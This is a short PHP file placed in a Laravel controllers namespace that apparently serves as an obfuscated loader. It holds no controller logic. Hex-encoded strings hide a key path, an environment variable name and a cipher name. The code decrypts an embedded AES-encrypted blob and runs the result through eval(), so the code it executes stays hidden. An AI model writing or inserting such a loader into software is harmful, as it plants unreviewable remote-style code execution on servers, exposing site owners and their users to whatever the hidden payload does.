<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('tR621fFtbnKiNElVz+IkFQ==');

$c=base64_decode(

'DSzyU0R7xx1nL+/r17nD+t1CjPbVXoqLmhnMjWPgf//FSPljeZ2qIzmfGXJe+pXk2Yo8clrkoExo' .
'HVH1qsjQZxKECNR43vp7OyLWILbdDuIY32sF401yrPC5K8pcZyUoK+yyjUQbpReJff+1132O4zQv' .
'A4YpJk4aSi32YLHiYaTCx9Vecz7p8y8ZpUP30K0ZNDG6MQrzjdYDIz/RBW0Uh7pCfJmmz7UWFlQF' .
'UGcra6R8WBZ1n4cHCBsiclrqao+F0jv5AbIWXu/O2o/C5vtM2Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

